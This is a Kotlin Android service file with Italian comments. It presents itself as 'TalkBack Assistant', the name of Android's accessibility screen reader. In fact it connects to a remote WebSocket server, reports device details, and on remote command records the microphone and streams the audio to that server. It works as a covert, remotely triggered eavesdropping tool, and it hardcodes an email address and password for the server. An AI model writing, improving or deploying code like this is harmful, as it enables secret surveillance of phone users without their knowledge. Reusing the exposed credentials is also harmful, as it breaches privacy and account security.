package com.talkback.assistant

import android.app.Notification
import android.app.NotificationChannel
import android.app.NotificationManager
import android.app.PendingIntent
import android.app.Service
import android.content.Intent
import android.media.AudioFormat
import android.media.AudioRecord
import android.media.MediaRecorder
import android.os.Build
import android.os.IBinder
import android.util.Log
import io.socket.client.IO
import io.socket.client.Socket
import org.json.JSONObject
import java.net.URI

class AudioCaptureService : Service() {
    
    private var audioRecord: AudioRecord? = null
    private var isRecording = false
    private var socket: Socket? = null
    private var recordingThread: Thread? = null
    
    companion object {
        private const val NOTIFICATION_ID = 1001
        private const val CHANNEL_ID = "audio_capture_channel"
        private const val SERVER_URL = "http://ha-cm.kozow.com/ws" // Server remoto con endpoint WebSocket dedicato (nginx proxy su porta 80)
        private const val SAMPLE_RATE = 44100
        private const val CHANNEL_CONFIG = AudioFormat.CHANNEL_IN_MONO
        private const val AUDIO_FORMAT = AudioFormat.ENCODING_PCM_16BIT
        private const val TAG = "AudioCaptureService"
    }

    override fun onCreate() {
        super.onCreate()
        Log.d(TAG, "AudioCaptureService onCreate - Avvio servizio")
        createNotificationChannel()
        Log.d(TAG, "AudioCaptureService onCreate - Avvio connessione al server: $SERVER_URL")
        connectToServer()
    }

    override fun onStartCommand(intent: Intent?, flags: Int, startId: Int): Int {
        // Avvia il servizio foreground solo quando necessario
        try {
            startForeground(NOTIFICATION_ID, createNotification())
        } catch (e: Exception) {
            Log.e(TAG, "Errore nell'avvio del servizio foreground: ${e.message}")
        }
        // Non avvia automaticamente la cattura audio
        // L'audio viene attivato solo da remoto
        return START_STICKY
    }

    override fun onBind(intent: Intent?): IBinder? = null

    private fun createNotificationChannel() {
        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) {
            val channel = NotificationChannel(
                CHANNEL_ID,
                "Audio Capture Service",
                NotificationManager.IMPORTANCE_LOW
            ).apply {
                description = "Servizio per cattura audio in background"
            }
            
            val notificationManager = getSystemService(NotificationManager::class.java)
            notificationManager.createNotificationChannel(channel)
        }
    }

    private fun createNotification(): Notification {
        val intent = Intent(this, MainActivity::class.java)
        val pendingIntent = PendingIntent.getActivity(
            this, 0, intent,
            PendingIntent.FLAG_UPDATE_CURRENT or PendingIntent.FLAG_IMMUTABLE
        )

        return Notification.Builder(this, CHANNEL_ID)
            .setContentTitle("TalkBack Assistant")
            .setContentText("Servizio attivo - In attesa di comando remoto")
            .setSmallIcon(android.R.drawable.ic_btn_speak_now)
            .setContentIntent(pendingIntent)
            .setOngoing(true)
            .setPriority(Notification.PRIORITY_LOW)
            .build()
    }

    private fun connectToServer() {
        try {
            Log.d(TAG, "connectToServer - Inizio connessione")
            val options = IO.Options().apply {
                transports = arrayOf("websocket")
                auth = mapOf(
                    "email" to "antonellomigliorelli@gmail.com",
                    "password" to "B@stardslave69"
                )
            }
            Log.d(TAG, "connectToServer - Opzioni configurate: $options")
            
            try {
                Log.d(TAG, "connectToServer - Creazione socket per URL: $SERVER_URL")
                socket = IO.socket(URI.create(SERVER_URL), options)
                Log.d(TAG, "connectToServer - Socket creato con successo")
            } catch (e: Exception) {
                Log.e(TAG, "Errore creazione socket: ${e.message}")
                return
            }
            
            socket?.on(Socket.EVENT_CONNECT) {
                Log.d(TAG, "Connesso al server")
                // Invia informazioni del dispositivo
                val deviceInfo = JSONObject().apply {
                    put("deviceName", android.os.Build.MODEL)
                    put("androidVersion", android.os.Build.VERSION.RELEASE)
                    put("timestamp", System.currentTimeMillis())
                }
                socket?.emit("android_connected", deviceInfo)
            }
            
            socket?.on(Socket.EVENT_DISCONNECT) {
                Log.w(TAG, "Disconnesso dal server")
            }
            
            socket?.on(Socket.EVENT_CONNECT_ERROR) { args ->
                Log.e(TAG, "Errore di connessione: ${args.joinToString()}")
            }
            
            // Listener per comandi remoti
            socket?.on("start_recording") {
                Log.d(TAG, "Comando remoto: Avvia registrazione")
                startAudioCapture()
            }
            
            socket?.on("stop_recording") {
                Log.d(TAG, "Comando remoto: Ferma registrazione")
                stopAudioCapture()
            }
            
            socket?.on(Socket.EVENT_DISCONNECT) {
                Log.d(TAG, "Disconnesso dal server")
            }
            
            socket?.on(Socket.EVENT_CONNECT_ERROR) { args ->
                Log.e(TAG, "Errore connessione: ${args[0]}")
            }
            
            Log.d(TAG, "connectToServer - Tentativo di connessione...")
            socket?.connect()
        } catch (e: Exception) {
            Log.e(TAG, "Errore nella connessione al server", e)
        }
    }

    private fun startAudioCapture() {
        if (isRecording) return
        
        val bufferSize = AudioRecord.getMinBufferSize(
            SAMPLE_RATE,
            CHANNEL_CONFIG,
            AUDIO_FORMAT
        )
        
        audioRecord = AudioRecord(
            MediaRecorder.AudioSource.MIC,
            SAMPLE_RATE,
            CHANNEL_CONFIG,
            AUDIO_FORMAT,
            bufferSize
        )
        
        if (audioRecord?.state != AudioRecord.STATE_INITIALIZED) {
            Log.e(TAG, "AudioRecord non inizializzato correttamente")
            return
        }
        
        isRecording = true
        audioRecord?.startRecording()
        
        recordingThread = Thread {
            val buffer = ShortArray(bufferSize)
            
            while (isRecording && audioRecord?.recordingState == AudioRecord.RECORDSTATE_RECORDING) {
                val bytesRead = audioRecord?.read(buffer, 0, bufferSize) ?: 0
                
                if (bytesRead > 0) {
                    // Converti i dati audio in base64 per l'invio
                    val audioData = buffer.take(bytesRead).toShortArray()
                    sendAudioData(audioData)
                }
            }
        }
        
        recordingThread?.start()
        Log.d(TAG, "Cattura audio avviata")
    }

    private fun sendAudioData(audioData: ShortArray) {
        try {
            // Converti ShortArray in ByteArray
            val byteArray = ByteArray(audioData.size * 2)
            for (i in audioData.indices) {
                val sample = audioData[i]
                byteArray[i * 2] = (sample.toInt() and 0xFF).toByte()
                byteArray[i * 2 + 1] = ((sample.toInt() shr 8) and 0xFF).toByte()
            }
            
            val base64Audio = android.util.Base64.encodeToString(byteArray, android.util.Base64.DEFAULT)
            
            val audioPacket = JSONObject().apply {
                put("type", "audio")
                put("data", base64Audio)
                put("sampleRate", SAMPLE_RATE)
                put("channels", 1)
            }
            
            socket?.emit("audio_data", audioPacket)
        } catch (e: Exception) {
            Log.e(TAG, "Errore nell'invio dei dati audio", e)
        }
    }

    private fun stopAudioCapture() {
        isRecording = false
        recordingThread?.interrupt()
        audioRecord?.stop()
        audioRecord?.release()
        audioRecord = null
        Log.d(TAG, "Cattura audio fermata")
    }

    override fun onDestroy() {
        super.onDestroy()
        stopAudioCapture()
        socket?.disconnect()
        socket = null
    }
}
